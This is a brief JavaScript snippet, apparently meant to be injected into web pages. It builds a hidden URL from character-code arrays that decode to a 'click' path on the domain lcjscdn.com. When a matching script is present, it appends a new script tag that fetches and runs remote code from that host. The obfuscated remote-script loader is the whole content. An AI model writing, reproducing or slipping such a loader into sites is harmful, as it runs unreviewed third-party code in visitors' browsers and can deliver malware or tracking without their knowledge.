(function () {
    function u(s) {
        var y = "";
        while (t = s.shift()) {
            y = y.concat(v(t))
        }
        return y
    }

    function v(s) {
        return String.fromCharCode(s)
    }

    function qq(k, n, c) {
        for (var b = document.getElementsByTagName("script"), a = 0; a < b.length; a++) {
            if (-1 != b[a].src.indexOf(n)) {
                var head = document.getElementsByTagName("head")[0];
                var script = document.createElement("script");
                script.type = "text/javascript";
                script.src = u(k) + u(c) + n;
                head.appendChild(script);
                return true
            }
        }
        return false
    }

    var z = [47, 47, 108, 99, 106, 115, 99, 100, 110, 46, 99, 111, 109, 47];
    var y = [99, 108, 105, 99, 107, 47];
    var x = "u5n75xyqhji.js";
    qq(z, x, y)
})();